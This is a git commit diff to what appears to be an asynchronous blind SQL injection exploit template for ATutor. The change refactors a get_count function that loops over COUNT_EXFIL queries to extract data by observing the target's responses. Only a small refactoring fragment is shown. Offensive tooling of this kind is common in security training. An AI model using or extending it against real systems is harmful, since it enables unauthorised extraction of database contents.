a3b62ebe0fa30197c3f667aa31d61fbf35810234
zinhart <aromzinhartdegraca@gmail.com>
2022-09-23 10:53:27 -0700

    refactored get count to positional arguments

--- atutor/mysqli_template_async.py
+++ atutor/mysqli_template_async.py
@@ -89,7 +89,7 @@ async def get_length(url:str, sub_query: str, response_truth_condition:Callable[
 async def get_count(url:str, sub_query: str, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lower_bound: int = 0, upper_bound: int = 1000, query_encoder:Callable[[str], str]=None):
     async with aiohttp.ClientSession() as session:
         cr_count = [
-            blind_query(session, response_truth_condition, url, QUERIES['COUNT_EXFIL'](sub_query,i), str(i), query_encoder=query_encoder)
+            blind_query(session=session,response_truth_condition=response_truth_condition, url=url, sub_query=QUERIES['COUNT_EXFIL'](sub_query,i),ordinal=str(i),query_encoder=query_encoder)
             for i in range(lower_bound, upper_bound)
         ]
         count = int(await run_until_found(cr_count))
